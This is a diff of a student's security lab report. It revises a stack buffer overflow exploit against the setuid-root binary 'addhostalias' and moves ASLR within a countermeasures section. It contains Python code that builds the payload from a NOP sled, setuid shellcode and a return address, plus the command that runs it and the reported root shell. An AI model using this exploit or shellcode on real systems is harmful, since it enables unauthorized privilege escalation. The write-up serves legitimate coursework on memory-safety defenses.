@@ -125,7 +125,15 @@ As aforementioned, we can construct the injection code as follows:
 
 1. Part A: A NOP sled with a length of `len(formatbuffer)-len(shellcode)`
 2. Part B: The given shellcode. As described in the lab instruction, the code generally create a shell, and set the real UID and GID as the effective UID, which is `root` here.
-3. Part C: The return address. We repeat it for `10` times to ensure it covers the original return address.
+3. Part C: 4 NOP instructions (4 bytes) to jump over the base pointer + The return address
+
+Thus, the final payload looks like:
+
+```
+payload = nop_sled (181B) + shellcode (75B) + nop*4 (4B, jump over BP) + ret_addr (4B)
+```
+
+The python code to generate the injection code is as follows.
 
 ```python
 #!/usr/bin/env python2
@@ -135,7 +143,7 @@ import struct
 
 # part A: the NOP sled
 nop = "\x90"
-nop_sled = nop * (256 - len(shellcode))
+nop_sled = nop * (256 - 75)
 
 # part B: the malicious shell code to be executed
 shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
@@ -149,8 +157,8 @@ shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
 # the ret addr is somewhere in the middle of the NOP sled.
 ret_addr = struct.pack("i", 0xbffffae0)
 
-# payload
-exploit = nop_sled + shellcode + ret_addr * 10  
+# payload = nop_sled (181B) + shellcode (75B) + nop*4 (4B, jump over BP) + ret_addr (4B)
+exploit = nop_sled + shellcode + nop * 4  + ret_addr
 
 print exploit
 ```
@@ -163,13 +171,17 @@ Here, we execute `addHostAlias`. The `ip` argument is the injection code we crea
 addhostalias $(python exploit.py) f x
 ```
 
+Since the binary `addhostalias` belongs to the `root` user, and the `-s` flag is enabled, which means that when executing it, our effective UID becomes `0`, enabling the shellcode to set the new shell's UID/GID to 0. 
+
+![屏幕截图 2025-05-01 150016](D:\chalmers\language_based_sec\labs\Language-based_security\lab2\屏幕截图 2025-05-01 150016.png)
+
 And then we get access to a root shell as expected.
 
 ![image-20250424192902149](屏幕截图 2025-04-24 192858.png)
 
 The memory layout of this exploitation is as follows:
 
-![屏幕截图 2025-04-24 193104](屏幕截图 2025-04-24 193104.png)
+![屏幕截图 2025-05-01 144543](D:\chalmers\language_based_sec\labs\Language-based_security\lab2\屏幕截图 2025-05-01 144543.png)
 
 ## 2. Persistent Access
 
@@ -264,9 +276,9 @@ We discuss the countermeasures at the following levels:
 ### 4.2 Run-time
 
 1. Use stack canaries. Add `-fstack-protector` flag when compiling with `gcc` can insert a random canary before the return address to detect data tempering during runtime. However, it is easy to escape, and it requires recompiling the code.
-2. Use Address Space Layout Randomization (ASLR). This can make the address of system calls more obscure for the attackers, and thus make it difficult to execute shell code. However, randomization is a overhead that we have to trade off. Simple randomization is easy to crack, and complex randomization leads to awful performance.
 
 ### 4.3 Operating System
 
 1. Use Data Execution Prevention (DEP). This technique makes the stack/heap area as non-executable at hardware/OS level, thus prevents the execution of malicious code in the exploited buffer. However, it cannot prevent Return Oriented Programming (ROP), which can utilize snippets of codes outside the buffer.
 2. Sandboxing. We can put the vulnerable programs into sandboxes, and thus the attacker can only get access to more limited resources.
+3. Use Address Space Layout Randomization (ASLR). This can make the address of system calls more obscure for the attackers, and thus make it difficult to execute shell code. However, randomization is a overhead that we have to trade off. Simple randomization is easy to crack, and complex randomization leads to awful performance.
